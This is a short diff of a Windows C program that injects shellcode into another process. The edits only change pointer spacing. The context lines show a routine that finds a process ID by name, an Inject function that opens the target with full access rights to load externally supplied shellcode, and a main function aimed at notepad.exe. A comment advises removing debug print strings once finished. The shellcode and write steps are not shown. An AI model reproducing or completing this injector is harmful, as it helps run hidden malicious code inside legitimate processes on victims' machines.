@@ -17,7 +17,7 @@ Externally defined shellcode variables:
 #define MAX_PROCESSES 1024
 #define PROCESS_NAME_MAX_LENGTH MAX_PATH
 
-DWORD findPID( const char *token ) {
+DWORD findPID( const char * token ) {
     DWORD aProcesses[1024], cbNeeded, cProcesses;
     unsigned int i;
     if ( !EnumProcesses( aProcesses, sizeof( aProcesses ), &cbNeeded ) ) {
@@ -47,7 +47,7 @@ DWORD findPID( const char *token ) {
     return 0;
 }
 
-BOOL Inject( DWORD pid, const char *target, size_t shellcodeSize, const unsigned char *shellcode ) {
+BOOL Inject( DWORD pid, const char * target, size_t shellcodeSize, const unsigned char * shellcode ) {
     HANDLE procHandle = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pid );
     if ( procHandle == NULL ) {
         printf( "[-] Could not open process handle\n" );
@@ -91,8 +91,8 @@ BOOL Inject( DWORD pid, const char *target, size_t shellcodeSize, const unsigned
     [!] Remember to remove the print strings when you are done debugging
 */
 
-int main( int argc, char *argv[] ) {
-    const char *target = "notepad.exe";
+int main( int argc, char * argv[] ) {
+    const char * target = "notepad.exe";
 
     DWORD pid = findPID( target );
     if ( pid == 0 ) {
